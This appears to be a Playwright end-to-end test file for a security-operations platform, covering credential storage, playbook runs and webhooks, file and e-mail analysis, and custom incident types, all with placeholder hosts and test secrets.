  await expect(area.getByText('draft saved')).toBeVisible()

  await page.goto(before)
  await expect(page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Summary' })).toBeEnabled()
})

test('a credential is stored once, named by an instance, kept from a typed secret, and not deleted while it is used', async () => {
  test.setTimeout(240_000)
  const before = page.url()
  const get = async (path) => (await page.request.get(path)).json()
  await page.getByRole('button', { name: 'Platform settings' }).click()
  const settings = page.getByRole('region', { name: 'Settings' })
  const sections = settings.getByRole('navigation', { name: 'Settings sections' })

  // Credentials is a section of its own, beside the connectors; the search box finds it by what it holds.
  await settings.getByLabel('Find a setting').fill('stored secrets')
  await expect(sections.getByRole('button')).toHaveText(['Credentials'])
  await settings.getByLabel('Find a setting').fill('')
  await sections.getByRole('button', { name: 'Credentials', exact: true }).click()
  await expect(page).toHaveURL(/\/settings\/automation\/credentials$/)
  const table = settings.getByRole('table', { name: 'Credentials' })
  await expect(table).toContainText('Nothing here yet.')

  // A pair: a user name, which is shown, and a password, which is never shown again.
  await settings.getByRole('button', { name: 'New credential…' }).click()
  const fresh = page.getByRole('dialog', { name: 'New credential' })
  await fresh.locator('#credential-name').fill('Acme Account')
  await expect(fresh.getByRole('button', { name: 'Create' })).toBeDisabled() // not a name an instance can write
  await expect(fresh).toContainText('A name is a lower-case letter')
  await fresh.locator('#credential-name').fill('acme_account')
  await fresh.locator('#credential-title').fill('The service account of the desk')
  await fresh.getByRole('radio', { name: /^User name and password/ }).check()
  await fresh.locator('#credential-username').fill('svc-store')
  await fresh.locator('#credential-value').fill('stored-pass-1')
  await fresh.getByRole('button', { name: 'Create' }).click()
  await expect(settings.getByRole('status')).toContainText('acme_account is stored.')
  const stored = table.getByRole('row').filter({ hasText: 'acme_account' })
  await expect(stored).toContainText('The service account of the desk')
  await expect(stored).toContainText('User name and password')
  await expect(stored).toContainText('svc-store')
  await expect(stored).toContainText('not used')
  expect(JSON.stringify(await get('/api/automation/credentials'))).not.toContain('stored-pass-1')

  // An instance made with it: the picker comes first when a credential fits, and a pair fills the user
  // name and the password together.
  await sections.getByRole('button', { name: 'Connectors', exact: true }).click()
  const installed = settings
    .getByRole('list', { name: 'Connectors', exact: true })
    .getByRole('listitem')
    .filter({ hasText: 'Acme Desk' })
    .first()
  await installed.getByRole('button', { name: 'Add an instance of Acme Desk' }).click()
  const form = settings.getByRole('complementary', { name: 'New instance of Acme Desk' })
  await form.locator('#instance-name').fill('Acme vault')
  await form.getByLabel('Instance address').fill('https://vault.example.invalid/api')
  await expect(form.getByLabel('How the password is given')).toHaveValue('credential')
  await form.getByLabel('Credential for the password').selectOption({ label: 'acme_account (svc-store)' })
  await expect(form.getByLabel('Credential for the user name')).toHaveValue('{{ credentials.acme_account.username }}')
  await form.getByRole('button', { name: 'Create' }).click()
  const row = installed
    .getByRole('list', { name: 'Instances of Acme Desk' })
    .getByRole('listitem')
    .filter({ hasText: 'Acme vault' })
  await expect(row).toContainText('vault.example.invalid')
  const instance = async () =>
    (await get('/api/automation/instances')).instances.find((item) => item.name === 'Acme vault')
  // What the instance holds is the name of the credential, not a copy of its value.
  expect((await instance()).credentials).toEqual({
    username: { name: 'acme_account', part: 'username', missing: false },
    password: { name: 'acme_account', part: 'password', missing: false },
  })
  expect(JSON.stringify(await instance())).not.toContain('stored-pass-1')

  // The form shows the name where the value would be, with a link to it; the credential says where it is used.
  await row.getByRole('button', { name: 'Edit Acme vault' }).click()
  const edit = settings.getByRole('complementary', { name: 'Instance Acme vault' })
  await expect(edit.getByLabel('Credential for the password')).toHaveValue('{{ credentials.acme_account.password }}')
  await expect(edit.locator('label[for="instance-field-password"]')).toContainText('from a credential')
  await edit.getByRole('link', { name: 'Open the credential acme_account' }).first().click()
  await expect(page).toHaveURL(/\/settings\/automation\/credentials\/acme_account$/)
  await expect(stored).toContainText('Acme vault')
  await expect(stored).toContainText('Acme Desk')
  await stored.getByRole('link', { name: 'Acme vault' }).click()
  await expect(page).toHaveURL(/\/settings\/automation\/connectors\/[^/]+$/)
  await expect(edit).toBeVisible()

  // A command runs through it: the credential is read, and the request goes as far as the host (which
  // does not exist here). Nothing that is kept of the run says the password.
  const ran = await page.request.post('/api/playground/command', {
    data: { line: '!acme-get-ticket number=T-1 using="Acme vault"' },
  })
  expect(ran.status()).toBe(201)
  await expect
    .poll(async () => JSON.stringify((await get('/api/playground')).entries), { timeout: 30_000 })
    .toContain('vault.example.invalid could not be resolved')
  const said = JSON.stringify((await get('/api/playground')).entries)
  expect(said).not.toContain('stored-pass-1')
  expect(said).not.toContain('does not exist: make it again')
  expect((await page.request.delete('/api/playground')).ok()).toBe(true)

  // Written by hand, as a variable: one that names no credential is refused; then the secrets are typed again.
  await edit.getByLabel('How the password is given').selectOption('typed')
  const password = edit.locator('#instance-field-password')
  await expect(password).toHaveAttribute('placeholder', 'from acme_account: type to replace it')
  await password.fill('{{ credentials.nope.password }}')
  await expect(password).toHaveAttribute('type', 'text') // a name, not a secret: shown as it is typed
  await edit.getByRole('button', { name: 'Save', exact: true }).click()
  await expect(edit.getByRole('alert')).toContainText('There is no credential called "nope"')
  await password.fill('typed-pass-2')
  await expect(password).toHaveAttribute('type', 'password')
  await edit.getByLabel('How the user name is given').selectOption('typed')
  await edit.locator('#instance-field-username').fill('svc2')
  await edit.getByRole('button', { name: 'Save', exact: true }).click()
  await expect(edit).toHaveCount(0)
  expect((await instance()).credentials).toEqual({})

  // Keep as a credential: what was typed is moved under a name, and nobody types it again.
  await row.getByRole('button', { name: 'Edit Acme vault' }).click()
  await edit.getByRole('button', { name: 'Keep the password as a credential' }).click()
  const keeping = page.getByRole('dialog', { name: 'Keep as a credential' })
  await expect(keeping).toContainText('The user name and the password stored in this instance are moved')
  const kept = keeping.locator('#keep-credential-name')
  await expect(kept).toHaveValue('acme_vault') // suggested from the name of the instance
  await kept.fill('acme_account')
  await expect(keeping).toContainText('A credential called "acme_account" exists already')
  await expect(keeping.getByRole('button', { name: 'Keep', exact: true })).toBeDisabled()
  await kept.fill('acme_vault')
  await keeping.getByRole('button', { name: 'Keep', exact: true }).click()
  await expect(keeping).toBeHidden()
  // The form stays open, and names the credential where it held the value.
  await expect(edit.getByLabel('Credential for the password')).toHaveValue('{{ credentials.acme_vault.password }}')
  await expect(edit.getByLabel('Credential for the user name')).toHaveValue('{{ credentials.acme_vault.username }}')
  const all = (await get('/api/automation/credentials')).credentials
  const moved = all.find((item) => item.name === 'acme_vault')
  expect([moved.kind, moved.username, moved.usedBy.map((use) => use.name)]).toEqual(['pair', 'svc2', ['Acme vault']])
  expect(all.find((item) => item.name === 'acme_account').usedBy).toEqual([])
  expect(JSON.stringify([all, await instance()])).not.toContain('typed-pass-2')
  await edit.getByRole('button', { name: 'Close the instance' }).click()

  // One that is used is not deleted, and keeps its name: the dialog says where it is used.
  await sections.getByRole('button', { name: 'Credentials', exact: true }).click()
  const used = table.getByRole('row').filter({ hasText: 'acme_vault' })
  await expect(used.getByRole('link', { name: 'Acme vault' })).toBeVisible()
  await used.getByRole('button', { name: 'Delete acme_vault' }).click()
  const refusal = page.getByRole('dialog', { name: 'Delete acme_vault?' })
  await expect(refusal).toContainText('It is used, and is not deleted while it is.')
  await expect(refusal.getByRole('link', { name: 'Acme vault' })).toBeVisible()
  await expect(refusal.getByRole('button', { name: 'Delete', exact: true })).toHaveCount(0)
  await refusal.getByRole('button', { name: 'Close', exact: true }).last().click()
  expect((await page.request.delete(`/api/automation/credentials/${moved.id}`)).status()).toBe(409)
  // Its row has the menu of an object: edit, copy its name and the variable, delete.
  await used.click({ button: 'right' })
  const menu = page.getByRole('menu')
  await expect(menu.getByRole('menuitem')).toHaveText([
    'Edit…',
    'Copy link',
    'Copy the name',
    'Copy the variable',
    'Delete…',
    'New credential…',
    ...GENERAL_MENU,
  ])
  await menu.getByRole('menuitem', { name: 'Edit…' }).click()
  const editing = page.getByRole('dialog', { name: 'Credential acme_vault' })
  await expect(editing.locator('#credential-name')).toBeDisabled()
  await expect(editing).toContainText('a credential that is used keeps its name')
  // The value is replaced without being shown: every instance that names it sends the new one next.
  await expect(editing.locator('#credential-value')).toHaveValue('')
  await editing.locator('#credential-value').fill('rotated-pass-3')
  await editing.getByRole('button', { name: 'Save', exact: true }).click()
  await expect(settings.getByRole('status')).toContainText('acme_vault is saved.')
  const audit = (await get('/api/audit?q=action:credential.update')).entries[0]
  expect(audit.details).toBe('Changed the credential "acme_vault": its password; used by Acme vault')
  expect(JSON.stringify(await get('/api/audit'))).not.toMatch(/stored-pass-1|typed-pass-2|rotated-pass-3/)

  // The instance is deleted: its credential stays, used by nothing, and can go. Nothing is left for the
  // tests that follow: without a credential the form of an instance is the one it always was.
  expect((await page.request.delete(`/api/automation/instances/${(await instance()).id}`)).status()).toBe(204)
  await sections.getByRole('button', { name: 'Connectors', exact: true }).click()
  await sections.getByRole('button', { name: 'Credentials', exact: true }).click()
  await expect(used).toContainText('not used')
  await used.getByRole('button', { name: 'Delete acme_vault' }).click()
  await page
    .getByRole('dialog', { name: 'Delete acme_vault?' })
    .getByRole('button', { name: 'Delete', exact: true })
    .click()
  await expect(settings.getByRole('status')).toContainText('acme_vault was deleted.')
  await stored.getByRole('button', { name: 'Delete acme_account' }).click()
  await page
    .getByRole('dialog', { name: 'Delete acme_account?' })
    .getByRole('button', { name: 'Delete', exact: true })
    .click()
  await expect(table).toContainText('Nothing here yet.')
  expect((await get('/api/automation/credentials')).credentials).toEqual([])
  await settings.getByRole('button', { name: 'Close settings' }).click()
  await page.goto(before)
  await expect(page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Summary' })).toBeEnabled()
})

test('a playbook is run on an artifact from its menu, and started from outside at its own address', async ({
  request,
}) => {
  test.setTimeout(180_000)
  const before = page.url()
  const menu = page.getByRole('menu')
  const look = (name, value) => ({
    id: 'look',
    kind: 'action',
    name,
    position: { x: 40, y: 160 },
    config: { action: 'nik.get-indicator', args: { value } },
  })
  const make = async (name, trigger, node) => {
    const made = await page.request.post('/api/automation/playbooks', { data: { name } })
    expect(made.status()).toBe(201)
    const id = (await made.json()).id
    const graph = {
      nodes: [{ id: 'start', kind: 'trigger', name: 'Trigger', position: { x: 40, y: 40 }, config: trigger }, node],
      edges: [{ from: 'start', to: 'look' }],
    }
    const saved = await page.request.post(`/api/automation/playbooks/${id}/versions`, { data: { graph } })
    expect(saved.status(), await saved.text()).toBe(201)
    return id
  }
  const onFile = await make(
    'Look up a file',
    { event: 'file.analysed', manual: true },
    look('Look up its hash', '{{ trigger.file.sha256 }}'),
  )
  const onMail = await make(
    'Triage a mail',
    { event: 'mail.analysed', manual: true },
    look('Look up the sender', '{{ trigger.mail.sender_domain }}'),
  )
  const outside = await make(
    'From outside',
    { webhook: true },
    look('Look up what was sent', '{{ trigger.body.value }}'),
  )

  // The menu of an artifact offers the playbooks that run on it: one about e-mails is not among them.
  await page.getByRole('button', { name: 'Artifacts', exact: true }).click()
  const panel = page.getByRole('complementary', { name: 'Artifacts panel' })
  await panel.getByRole('navigation', { name: 'Artifacts' }).getByText('dropper.bin').click({ button: 'right' })
  await menu.getByRole('menuitem', { name: 'Run a playbook…' }).click()
  const dialog = page.getByRole('dialog', { name: 'Run a playbook' })
  await expect(dialog.locator('#run-object')).toContainText('a file · dropper.bin')
  const choice = dialog.locator('#run-playbook')
  await expect(choice.locator(`option[value="${onFile}"]`)).toHaveCount(1)
  await expect(choice.locator(`option[value="${onMail}"]`)).toHaveCount(0)
  await choice.selectOption(onFile)
  await dialog.getByRole('button', { name: 'Run', exact: true }).click()
  await expect(page).toHaveURL(/\/automation\/runs\/[0-9a-f]+$/)
  const area = page.getByRole('region', { name: 'Automations' })
  await expect(area.getByRole('status', { name: 'Status of the run' })).toHaveText('done', { timeout: 20_000 })

  // The artifact's own page lists the run.
  await area.getByRole('button', { name: 'Close automations' }).click()
  await panel.getByRole('navigation', { name: 'Artifacts' }).getByText('dropper.bin').click()
  const strip = page.getByLabel('Playbook runs on this artifact')
  await expect(strip.getByRole('button', { name: /Look up a file/ })).toContainText('done')
  await expect(strip.getByRole('button', { name: 'Run a playbook…' })).toBeVisible()

  // A playbook that starts from outside gets an address in its Settings, shown once.
  await page.goto(`/automation/playbooks/${outside}/settings`)
  const hook = area.getByRole('region', { name: 'Address for requests from outside' })
  await expect(hook).toContainText('It has no address yet.')
  await hook.getByRole('button', { name: 'Create the address' }).click()
  const address = (await hook.locator('#hook-address').textContent()).trim()
  expect(address).toMatch(/\/api\/automation\/hooks\/[\w-]{40,}$/)

  // Off, it answers as an address that does not exist; on, a request with no session starts it.
  const send = () => request.post(new URL(address).pathname, { data: { value: '185.220.101.47' } })
  expect((await send()).status()).toBe(404)
  expect(
    (await page.request.put(`/api/automation/playbooks/${outside}/enabled`, { data: { enabled: true } })).status(),
  ).toBe(200)
  const taken = await send()
  expect(taken.status()).toBe(202)
  expect(await taken.json()).toEqual({ accepted: true })
  await expect(async () => {
    const runs = await (await page.request.get(`/api/automation/runs?playbook=${outside}`)).json()
    expect(runs.runs.map((run) => [run.trigger, run.status])).toEqual([['webhook', 'done']])
  }).toPass({ timeout: 20_000 })

  // Read again, the page no longer shows it; replaced, the old one stops working.
  await page.reload()
  await expect(hook).toContainText('Nik keeps only its hash')
  await expect(hook.locator('#hook-address')).toHaveCount(0)
  await hook.getByRole('button', { name: 'Replace the address' }).click()
  await page.getByRole('dialog', { name: 'Replace the address?' }).getByRole('button', { name: 'Replace' }).click()
  await expect(hook.locator('#hook-address')).not.toHaveText(address)
  expect((await send()).status()).toBe(404)

  for (const id of [onFile, onMail, outside]) {
    expect((await page.request.delete(`/api/automation/playbooks/${id}`)).status()).toBe(204)
  }
  await page.goto(before)
  await expect(page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Summary' })).toBeEnabled()
})

test('a playbook adds a file from a content and analyses it: the nodes are in the library, the file in the Evidence tab', async () => {
  test.setTimeout(180_000)
  const before = page.url()
  const incidentId = before.match(/\/incident\/([^/?#]+)/)[1]
  const made = await page.request.post('/api/automation/playbooks', { data: { name: 'Keeps a report' } })
  expect(made.status()).toBe(201)
  const playbookId = (await made.json()).id
  const action = (id, name, y, what, args) => ({
    id,
    kind: 'action',
    name,
    position: { x: 40, y },
    config: { action: what, args },
  })
  const report = 'host,verdict\nwks-7,see http://files.playbook.example/stage.bin\n'
  const graph = {
    nodes: [
      { id: 'start', kind: 'trigger', name: 'Trigger', position: { x: 40, y: 40 }, config: { manual: true } },
      action('add', 'Keep the report', 160, 'nik.add-file', { content: report, name: 'triage-report.csv' }),
      action('analyse', 'Analyse it', 280, 'nik.analyse-artifact', {
        artifact: '{{ add.artifact }}',
        analysis: 'static',
      }),
      action('read', 'What it found', 400, 'nik.get-analysis', { artifact: '{{ add.artifact }}' }),
    ],
    edges: [
      { from: 'start', to: 'add' },
      { from: 'add', to: 'analyse' },
      { from: 'analyse', to: 'read' },
    ],
  }
  const saved = await page.request.post(`/api/automation/playbooks/${playbookId}/versions`, { data: { graph } })
  expect(saved.status(), await saved.text()).toBe(201)

  // The editor: the nodes for files are a group of the library, and a node takes the artifact another gave.
  await page.goto(`/automation/playbooks/${playbookId}`)
  const area = page.getByRole('region', { name: 'Automations' })
  const library = area.getByRole('complementary', { name: 'Node library' })
  const inspector = area.getByRole('complementary', { name: 'Inspector' })
  await expect(library.getByRole('button', { name: 'Add a file', exact: true })).toBeHidden()
  await library.locator('summary').filter({ hasText: 'Files' }).click()
  for (const name of ['Add a file', 'Analyse an artifact', 'Read an analysis', 'List the artifacts of an incident']) {
    await expect(library.getByRole('button', { name, exact: true })).toBeVisible()
  }
  await area.getByTestId('playbook-canvas').locator('.react-flow__node').filter({ hasText: 'What it found' }).click()
  await expect(inspector.getByRole('textbox', { name: 'artifact *' })).toHaveValue('{{ add.artifact }}')
  await inspector.getByRole('button', { name: 'Pick a value' }).first().click()
  const picker = page.getByRole('dialog', { name: 'Pick a value' })
  const kept = picker.getByRole('group', { name: 'Keep the report' })
  await expect(kept.getByText('add.artifact', { exact: true })).toBeVisible()
  await expect(kept.getByText('add.sha256', { exact: true })).toBeVisible()
  const analysed = picker.getByRole('group', { name: 'Analyse it' })
  await expect(analysed.getByText('analyse.finished', { exact: true })).toBeVisible()
  await page.keyboard.press('Escape')
  await expect(picker).toHaveCount(0)

  // A dry run keeps nothing: the step says what it would have done.
  const run = async (body) => {
    const started = await page.request.post(`/api/automation/playbooks/${playbookId}/run`, { data: body })
    expect(started.status(), await started.text()).toBe(201)
    const id = (await started.json()).id
    let found = null
    await expect(async () => {
      found = await (await page.request.get(`/api/automation/runs/${id}`)).json()
      const said = JSON.stringify(found.steps.map((step) => [step.node, step.status, step.error]))
      expect(found.status, said).toBe('done')
    }).toPass({ timeout: 90_000 })
    return Object.fromEntries(found.steps.map((step) => [step.node, step]))
  }
  const dry = await run({ objectKind: 'incident', objectId: incidentId, dryRun: true })
  expect(dry.add.request.would).toBe('add the file')
  expect(dry.analyse.output.asked).toBe(false)
  expect((await page.request.get(`/api/artifacts/${dry.add.output.artifact}`)).status()).toBe(404)

  // For real: the API process keeps the file and analyses it, the run reads what was found.
  const steps = await run({ objectKind: 'incident', objectId: incidentId })
  const artifact = steps.add.output.artifact
  expect(steps.add.output).toMatchObject({ name: 'triage-report.csv', kind: 'file', linked: true, known: false })
  expect(artifact).toBe(dry.add.output.artifact)
  expect(steps.analyse.output).toMatchObject({ asked: true, finished: true, started: ['static'] })
  expect(steps.read.output.found).toBe(true)
  expect(steps.read.output.indicators).toContainEqual({
    type: 'url',
    value: 'http://files.playbook.example/stage.bin',
  })
  expect(JSON.stringify(steps.read.output)).not.toContain('wks-7')

  // The incident holds the file as one an analyst added.
  await page.goto(before)
  await openEvidence('Malware Analysis')
  await expect(page.getByRole('list', { name: 'Samples' })).toContainText('triage-report.csv', { timeout: 20_000 })
  const files = page.getByRole('navigation', { name: 'Evidence' }).getByRole('list', {
    name: 'Files of Malware Analysis',
  })
  await expect(files.getByRole('button', { name: 'triage-report.csv' })).toBeVisible()

  // A person deletes it: a playbook has no node that deletes evidence.
  const nodes = (await (await page.request.get('/api/automation/catalog')).json()).nodes
  expect(nodes.filter((entry) => entry.group === 'Files').map((entry) => entry.id)).not.toContain('nik.delete-artifact')
  expect((await page.request.delete(`/api/artifacts/${artifact}`)).status()).toBe(204)
  expect((await page.request.delete(`/api/automation/playbooks/${playbookId}`)).status()).toBe(204)
  await page.goto(before)
  await openEvidence('Malware Analysis')
  await expect(page.getByRole('list', { name: 'Samples' })).not.toContainText('triage-report.csv')
  await page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Summary' }).click()
})

test('a file that is a message is analysed as an e-mail from its page; the new nodes and events are offered', async () => {
  test.setTimeout(120_000)
  const before = page.url()
  // A message held as a file, as a connector or an archive leaves it.
  const message = [
    'From: "Anna" <anna@partner.example>',
    'To: soc@acme.example',
    'Subject: Kept as a file first',
    'Date: Tue, 10 Nov 2026 09:00:00 +0100',
    'Message-ID: <e2e-as-mail@partner.example>',
    'MIME-Version: 1.0',
    'Content-Type: text/plain; charset=utf-8',
    '',
    'Please see the attached notes.',
    '',
  ].join('\r\n')
  const uploaded = await page.request.post('/api/artifacts/files', {
    multipart: {
      file: { name: 'kept-as-a-file.eml', mimeType: 'application/octet-stream', buffer: Buffer.from(message) },
    },
  })
  expect(uploaded.status(), await uploaded.text()).toBe(201)
  const file = await uploaded.json()
  expect(file.kind).toBe('file')
  expect(file.analyseAs).toEqual(['mail'])

  // Its page offers what it can be analysed as, and nothing it cannot.
  await page.goto(`/artifact/${file.id}`)
  await expect(page.getByRole('button', { name: 'Analyse as a capture' })).toHaveCount(0)
  await page.getByRole('button', { name: 'Analyse as an e-mail' }).click()
  await expect(page).toHaveURL(new RegExp(`/artifact/mail-${file.ref}$`))
  await expect(page.getByText('analysis of file “kept-as-a-file.eml”')).toBeVisible()
  const made = await (await page.request.get(`/api/artifacts/mail-${file.ref}`)).json()
  expect(made.kind).toBe('mail')
  expect(made.name).toBe('Kept as a file first')
  expect(made.parents.map((parent) => [parent.id, parent.relation])).toEqual([[file.id, 'analysed']])
  // The file stays what it was, and shows what was made of it.
  await page.goto(`/artifact/${file.id}`)
  await expect(page.getByText('analysis: Kept as a file first')).toBeVisible()

  // The library and the trigger offer what 6.6 added.
  const nodes = (await (await page.request.get('/api/automation/catalog')).json()).nodes
  const files = nodes.filter((entry) => entry.group === 'Files').map((entry) => entry.name)
  expect(files).toEqual(expect.arrayContaining(['Download a file', 'Unpack an archive', 'Analyse an artifact']))
  const playbook = await page.request.post('/api/automation/playbooks', { data: { name: 'Waits for a capture' } })
  const playbookId = (await playbook.json()).id
  await page.goto(`/automation/playbooks/${playbookId}`)
  const area = page.getByRole('region', { name: 'Automations' })
  await area.getByTestId('playbook-canvas').locator('.react-flow__node').first().click()
  const events = area.getByRole('complementary', { name: 'Inspector' }).getByLabel('On an event')
  for (const event of ['code.analysed', 'capabilities.analysed', 'capture.analysed']) {
    await expect(events.locator(`option[value="${event}"]`)).toHaveCount(1)
  }

  expect((await page.request.delete(`/api/automation/playbooks/${playbookId}`)).status()).toBe(204)
  for (const id of [`mail-${file.ref}`, file.id]) {
    expect((await page.request.delete(`/api/artifacts/${id}`)).status()).toBe(204)
  }
  await page.goto(before)
  await expect(page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Summary' })).toBeEnabled()
})

test('a type of incident is built with a field of its own, and closing asks for what it wants', async () => {
  test.setTimeout(120_000)
  const before = page.url()
  const incidentId = decodeURIComponent(new URL(before).pathname.split('/')[2])
  const was = (await (await page.request.get(`/api/incidents/${incidentId}/fields`)).json()).fields.status

  await page.getByRole('button', { name: 'Platform settings' }).click()
  const settings = page.getByRole('region', { name: 'Settings' })
  const sections = settings.getByRole('navigation', { name: 'Settings sections' })
  await sections.getByText('Types', { exact: true }).click()
  await expect(page).toHaveURL(/\/settings\/incidents\/types$/)
  // The types Nik ships; every incident that was given none is Unclassified.
  const types = settings.getByRole('table', { name: 'Incident types' })
  await expect(types.getByRole('row')).toHaveCount(8)
  await expect(types.getByRole('row').nth(1)).toContainText('Unclassified')

  await settings.getByRole('button', { name: 'New type' }).click()
  const create = page.getByRole('dialog', { name: 'New type' })
  await create.locator('#new-type-name').fill('E2E outage')
  await create.getByRole('button', { name: 'Create the type' }).click()
  await expect(settings.locator('#type-name')).toHaveValue('E2E outage')

  // A field of its own, made from the side list: it lands in the section that is being added to.
  const offered = settings.getByRole('region', { name: 'Fields to add' })
  await offered.getByRole('button', { name: 'New field' }).click()
  const field = page.getByRole('dialog', { name: 'New field' })
  await field.locator('#field-label').fill('Root cause')
  await expect(field.locator('#field-name')).toHaveValue('root_cause')
  await field.locator('#field-type').selectOption('long_text')
  await field.getByRole('button', { name: 'Create the field' }).click()
  const about = settings.getByRole('region', { name: 'Section What it is about' })
  const placed = about.getByRole('listitem').filter({ hasText: 'Root cause' })
  await expect(placed).toHaveCount(1)
  await placed.getByLabel('to close').check()
  // A field of the registry is added with a click, and moved with the arrows.
  await offered.getByPlaceholder('Find a field…').fill('due')
  await offered.getByRole('button', { name: /^Due/ }).click()
  await expect(about.getByRole('listitem').last()).toContainText('Due')
  await about.getByRole('button', { name: 'Move Due up' }).click()
  await expect(about.getByRole('listitem').last()).toContainText('Root cause')
  // A section of its own, made the side panel in place of the first.
  await settings.getByRole('button', { name: 'Add a section' }).click()
  const added = settings.getByRole('region', { name: 'Section New section' })
  await added.getByLabel('Title of the section').fill('Impact')
  await settings.locator('#type-reasons').fill('Fixed\nNot ours')
  // The page of the type, under "Pages": the grid Nik makes from the sections, and a widget added to it.
  await settings.getByRole('tab', { name: 'Pages' }).click()
  const arranged = settings.getByRole('region', { name: 'The page' })
  await expect(arranged).toContainText('the page Nik makes from the sections')
  await expect(arranged.getByRole('article')).toHaveCount(5)
  await expect(arranged.getByRole('article', { name: 'Impact' })).toBeVisible()
  await arranged.locator('#page-add-kind').selectOption('note')
  await arranged.getByRole('button', { name: 'Add', exact: true }).click()
  await expect(arranged).toContainText('arranged by hand')
  await arranged.getByRole('button', { name: 'Edit A text' }).click()
  const widget = page.getByRole('dialog', { name: 'Widget: A text' })
  await widget.locator('#widget-title').fill('First steps')
  await widget.locator('#widget-text').fill('Call the owner of the service.')
  await widget.getByRole('button', { name: 'Done' }).click()
  await expect(arranged.getByRole('article', { name: 'First steps' })).toContainText('Call the owner of the service.')
  // What is on a page once is not offered again; a widget is moved with the keyboard.
  await expect(arranged.locator('#page-add-kind').locator('option')).not.toContainText(['Incident details'])
  const grip = arranged.getByRole('button', { name: /^Move First steps/ })
  await grip.focus()
  await page.keyboard.press('ArrowRight')
  await expect(settings.getByText('not saved')).toBeVisible()
  await settings.getByRole('button', { name: 'Save the type' }).click()
  await expect(settings.getByText('not saved')).toHaveCount(0)
  const saved = await (await page.request.get('/api/incident-types/e2e-outage')).json()
  expect(saved.layout.grid.map((item) => item.kind)).toEqual([
    'facts',
    'stats',
    'section',
    'section',
    'timeline',
    'note',
  ])
  expect(saved.layout.grid.at(-1)).toMatchObject({ title: 'First steps', text: 'Call the owner of the service.', x: 1 })
  expect(saved.fields).toEqual([{ name: 'root_cause', required: false, requiredOnClose: true }])
  expect(saved.closeReasons).toEqual(['Fixed', 'Not ours'])
  expect(saved.layout.sections.map((section) => section.title)).toEqual(['Key facts', 'What it is about', 'Impact'])
  expect(saved.layout.sections[1].fields.slice(-2)).toEqual(['due', 'root_cause'])

  // The registry as a whole: the new field is there, with where it is used.
  await sections.getByText('All fields', { exact: true }).click()
  await expect(page).toHaveURL(/\/settings\/incidents\/all-fields$/)
  await settings.getByPlaceholder('Find a field…').fill('root')
  const all = settings.getByRole('table', { name: 'All fields' })
  await expect(all.getByRole('row')).toHaveCount(2)
  await all.getByRole('button', { name: 'Edit the field Root cause' }).click()
  const edit = page.getByRole('dialog', { name: 'Field root_cause' })
  await expect(edit).toContainText('Listed by: E2E outage.')
  await edit.getByRole('button', { name: 'Cancel' }).click()
  await settings.getByRole('button', { name: 'Close settings' }).click()

  // An incident of that type cannot be closed without what the type wants: the form asks for it.
  const opened = await page.request.patch(`/api/incidents/${incidentId}/fields`, {
    data: { changes: { type: 'e2e-outage', status: 'open' } },
  })
  expect(opened.status(), await opened.text()).toBe(200)
  await page.goto(before)
  await page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Summary', exact: true }).click()
  const details = page.getByRole('article', { name: 'Incident details' })
  await expect(details).toContainText('open')

  // The page follows the type: its key facts in a panel beside the tabs, its other sections in the Summary.
  const facts = page.getByRole('complementary', { name: 'Incident facts' })
  await expect(facts).toContainText('E2E outage')
  await expect(facts.locator('#incident-type')).toHaveValue('e2e-outage')
  await facts.getByRole('button', { name: 'Edit' }).click()
  const key = page.getByRole('dialog', { name: 'Key facts' })
  await key.locator('#edit-tlp').selectOption('amber')
  await key.locator('#edit-occurred').fill('2026-11-16T08:30')
  await key.getByRole('button', { name: 'Save' }).click()
  await expect(key).toHaveCount(0)
  await expect(facts).toContainText('amber')
  await expect(facts).toContainText('2026-11-16 08:30 UTC')
  // It stays while the tabs change, and folds away for a wide one.
  const tabs = page.locator('nav[aria-label="Analysis tabs"]')
  await tabs.getByRole('button', { name: 'Timeline', exact: true }).click()
  await expect(facts).toContainText('amber')
  await facts.getByRole('button', { name: "Hide the incident's facts" }).click()
  await expect(facts).not.toContainText('amber')
  await facts.getByRole('button', { name: "Show the incident's facts" }).click()
  await expect(facts).toContainText('amber')
  await tabs.getByRole('button', { name: 'Summary', exact: true }).click()
  // The Summary is the page the type arranged: its widgets, with the text added in Settings.
  const summary = page.getByRole('region', { name: 'Summary of the incident' })
  await expect(summary.getByRole('article', { name: 'First steps' })).toContainText('Call the owner of the service.')
  await expect(summary.getByRole('article')).toHaveCount(6)
  const section = summary.getByRole('article', { name: 'What it is about' })
  await expect(section).toContainText('Root cause')
  await section.getByRole('button', { name: 'Edit What it is about' }).click()
  const form = page.getByRole('dialog', { name: 'What it is about' })
  await form.locator('#edit-labels').fill('outage, e2e')
  await form.locator('#edit-due').fill('2026-12-01T12:00')
  await form.getByRole('button', { name: 'Save' }).click()
  await expect(form).toHaveCount(0)
  await expect(section).toContainText('outage')
  await expect(section).toContainText('2026-12-01 12:00 UTC')

  await details.getByRole('button', { name: 'Edit the incident' }).click()
  const editing = page.getByRole('dialog', { name: 'Edit the incident' })
  await editing.locator('#incident-status').selectOption('closed')
  await editing.getByRole('button', { name: 'Save', exact: true }).click()
  const closing = page.getByRole('dialog', { name: 'Close the incident' })
  await expect(closing).toContainText('E2E outage')
  await expect(closing.locator('#close-reason').locator('option')).toHaveText(['(not set)', 'Fixed', 'Not ours'])
  await closing.locator('#close-reason').selectOption('Fixed')
  await closing.getByRole('button', { name: 'Close the incident' }).click()
  await expect(closing.getByRole('alert')).toHaveText('Root cause is needed to close')
  await closing.locator('#close-field-root_cause').fill('A rule written too wide.')
  await closing.getByRole('button', { name: 'Close the incident' }).click()
  await expect(closing).toHaveCount(0)
  await expect(details).toContainText('closed')
  const held = (await (await page.request.get(`/api/incidents/${incidentId}/fields`)).json()).fields
  expect([held.status, held.close_reason, held.root_cause]).toEqual(['closed', 'Fixed', 'A rule written too wide.'])
  expect(held.closed).toBeTruthy()

  // Left as it was for what follows, with no type; the type is deleted and its incident keeps its values.
  expect((await page.request.delete('/api/incident-types/e2e-outage')).status()).toBe(204)
  const again = await page.request.patch(`/api/incidents/${incidentId}/fields`, {
    data: { changes: { status: was } },
  })
  expect(again.status()).toBe(200)
  await page.goto(before)
  await expect(page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Summary' })).toBeEnabled()
})

